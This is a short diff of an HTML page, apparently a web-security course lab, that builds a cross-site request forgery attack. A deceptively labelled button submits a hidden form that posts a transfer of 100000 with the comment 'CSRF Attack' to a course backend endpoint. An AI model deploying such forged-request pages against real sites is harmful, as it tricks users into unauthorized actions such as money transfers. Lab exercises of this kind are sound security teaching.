@@ -7,11 +7,7 @@
     <button onclick="runCSRFAttack()">Totally inconspicuous button that you should click</button>
 
     <form
-      id="attack-form"
-      method="POST"
-      action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo"
-      style="display:none"
-    >
+      id="attack-form" method="POST" action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo" enctype="text/plain">
       
       <input type="hidden" name="amount" value="100000">
       <input type="hidden" name="comment" value="CSRF Attack">
